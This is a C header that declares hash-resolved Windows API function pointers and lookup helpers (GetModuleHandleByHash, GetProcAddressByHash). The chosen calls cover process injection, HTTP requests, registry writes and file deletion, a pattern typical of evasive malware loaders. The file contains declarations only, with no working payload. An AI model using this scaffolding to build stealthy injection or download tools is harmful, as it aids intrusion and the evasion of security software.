#ifndef _API_H_
#define _API_H_

/* NTDLL */
#include "ntdll_functions.h"
#include "ntdll_hash.h"

/* Kernel32 */
#include "kernel32_functions.h"
#include "kernel32_hash.h"

/* User32 */
#include "user32_hash.h"
#include "user32_functions.h"

/* WinInet */
#include "wininet_hash.h"
#include "wininet_functions.h"

/* Shell32 */
#include "shell32_hash.h"
#include "shell32_functions.h"

/* Advapi32 */
#include "advapi32_hash.h"
#include "advapi32_functions.h"


/* Structures */

typedef struct
{
	/* NTDLL */
	ptRtlRandomEx pRtlRandomEx;
	ptRtlGetVersion pRtlGetVersion;
	ptNtCreateThread pNtCreateThread;
	ptNtQueryInformationProcess pNtQueryInformationProcess;
	ptNtCreateUserProcess pNtCreateUserProcess;
	ptNtMapViewOfSection pNtMapViewOfSection;
	ptNtCreateSection pNtCreateSection;
	ptLdrLoadDll pLdrLoadDll;
	ptLdrGetDllHandle pLdrGetDllHandle;
	ptNtWriteVirtualMemory pNtWriteVirtualMemory;
	ptNtAllocateVirtualMemory pNtAllocateVirtualMemory;
	ptNtProtectVirtualMemory pNtProtectVirtualMemory;
	ptNtDeviceIoControlFile pNtDeviceIoControlFile;
	ptNtSetContextThread pNtSetContextThread;
	ptNtOpenProcess pNtOpenProcess;
	ptNtClose pNtClose;
	ptNtCreateFile pNtCreateFile;
	ptNtOpenFile pNtOpenFile;
	ptNtDeleteFile pNtDeleteFile;
	ptNtReadVirtualMemory pNtReadVirtualMemory;
	ptNtQueryVirtualMemory pNtQueryVirtualMemory;
	ptNtOpenThread pNtOpenThread;
	ptNtQueryInformationThread pNtQueryInformationThread;
	ptNtResumeThread pNtResumeThread;
	ptNtFreeVirtualMemory pNtFreeVirtualMemory;
	ptNtFlushInstructionCache pNtFlushInstructionCache;
	ptNtSetInformationThread pNtSetInformationThread;
	ptNtQuerySystemInformation pNtQuerySystemInformation;
	ptLdrQueryProcessModuleInformation pLdrQueryProcessModuleInformation;
	ptRtlInitUnicodeString pRtlInitUnicodeString;
	ptNtWriteFile pNtWriteFile;
	ptNtReadFile pNtReadFile;
	ptNtDelayExecution pNtDelayExecution;
	ptNtOpenKey pNtOpenKey;
	ptNtSetValueKey pNtSetValueKey;
	ptNtQueryValueKey pNtQueryValueKey;
	ptRtlFormatCurrentUserKeyPath pRtlFormatCurrentUserKeyPath;
	ptNtQueryInformationFile pNtQueryInformationFile;

	/* Kernel32 */
	ptVirtualAlloc pVirtualAlloc;
	ptVirtualFree pVirtualFree;
	ptOpenProcess pOpenProcess;
	ptVirtualAllocEx pVirtualAllocEx;
	ptVirtualFreeEx pVirtualFreeEx;
	ptWriteProcessMemory pWriteProcessMemory;
	ptCreateRemoteThread pCreateRemoteThread;
	ptCloseHandle pCloseHandle;
	ptCreateToolhelp32Snapshot pCreateToolhelp32Snapshot;
	ptCreateProcessW pCreateProcessW;
	ptVirtualProtect pVirtualProtect;
	ptProcess32FirstW pProcess32FirstW;
	ptProcess32NextW pProcess32NextW;
	ptExitProcess pExitProcess;
	ptGetModuleFileNameW pGetModuleFileNameW;
	ptDeleteFileW pDeleteFileW;
	ptSleep pSleep;
	ptLoadLibraryW pLoadLibraryW;
	ptIsWow64Process pIsWow64Process;
	ptGetCurrentProcessId pGetCurrentProcessId;
	ptGetWindowsDirectoryW pGetWindowsDirectoryW;
	ptQueueUserAPC pQueueUserAPC;
	ptResumeThread pResumeThread;
	ptGetSystemDirectoryW pGetSystemDirectoryW;
	ptFindFirstFileW pFindFirstFileW;
	ptFindNextFileW pFindNextFileW;
	ptCreateThread pCreateThread;
	ptCreateFileW pCreateFileW;
	ptWriteFile pWriteFile;
	ptReadFile pReadFile;
	ptGetFileSize pGetFileSize;
	ptGetVersionExW pGetVersionExW;
	ptFindFirstVolumeW pFindFirstVolumeW;
	ptGetVolumeInformationW pGetVolumeInformationW;
	ptFindVolumeClose pFindVolumeClose;
	ptMultiByteToWideChar pMultiByteToWideChar;
	ptGetModuleHandleW pGetModuleHandleW;
	ptFlushInstructionCache pFlushInstructionCache;
	ptGetProcessHeap pGetProcessHeap;
	ptHeapAlloc pHeapAlloc;
	ptHeapFree pHeapFree;
	ptGetCurrentProcess pGetCurrentProcess;
	ptThread32First pThread32First;
	ptThread32Next pThread32Next;
	ptOpenMutexW pOpenMutexW;
	ptReleaseMutex pReleaseMutex;
	ptCreateMutexW pCreateMutexW;
	ptVirtualQuery pVirtualQuery;
	ptCreateFileMappingW pCreateFileMappingW;
	ptMapViewOfFile pMapViewOfFile;
	ptUnmapViewOfFile pUnmapViewOfFile;
	ptDuplicateHandle pDuplicateHandle;
	ptGetCurrentThread pGetCurrentThread;
	ptFlushFileBuffers pFlushFileBuffers;
	ptDisconnectNamedPipe pDisconnectNamedPipe;
	ptGetProcAddress pGetProcAddress;
	ptRtlInitializeCriticalSection pRtlInitializeCriticalSection;
	ptRtlEnterCriticalSection pRtlEnterCriticalSection;
	ptRtlLeaveCriticalSection pRtlLeaveCriticalSection;
	ptWideCharToMultiByte pWideCharToMultiByte;
	ptTerminateThread pTerminateThread;
	ptGetTickCount pGetTickCount;
	ptOutputDebugStringA pOutputDebugStringA;
	ptOutputDebugStringW pOutputDebugStringW;
	ptGetLastError pGetLastError;
	ptSetEvent     pSetEvent;
	ptCreateEventA pCreateEventA;
	ptCreateEventW pCreateEventW;
	ptOpenEventA   pOpenEventA;
	ptOpenEventW   pOpenEventW;
	

	/* User32 */
	ptMessageBoxA pMessageBoxA;
	ptwsprintfW pwsprintfW;
	ptwsprintfA pwsprintfA;
	ptGetCursorPos pGetCursorPos;

	/* WinInet */
	ptInternetOpenW pInternetOpenW;
	ptInternetConnectA pInternetConnectA;
	ptHttpOpenRequestA pHttpOpenRequestA;
	ptHttpSendRequestA pHttpSendRequestA;
	ptHttpQueryInfoA pHttpQueryInfoA;
	ptInternetCloseHandle pInternetCloseHandle;
	ptInternetReadFile pInternetReadFile;

	/* Shell32 */
	ptSHGetFolderPathW pSHGetFolderPathW;

	/* Advapi32 */
	ptGetUserNameA pGetUserNameA;
} API_FUNCTIONS;

typedef struct
{
	HMODULE Kernel32, Ntdll, User32, Wininet, Shell32, Advapi32, Urlmon, Ws2_32, Shlwapi;
} API_MODULES;

typedef struct
{
	DWORD	 ModuleHash;
	HMODULE* Module;
} API_MODULE;

typedef struct
{
	DWORD	 FunctionHash;
	HMODULE* Module;
	LPVOID*  Function;
} API_T;

typedef struct
{
	DWORD Table[256];
	BOOL  Initialized;
} CRC;

/* Functions */
HMODULE GetModuleHandleByHash(DWORD Hash);
LPVOID GetProcAddressByHash(
	HMODULE Module,
	DWORD Hash
);
BOOL ApiInitialize();

#endif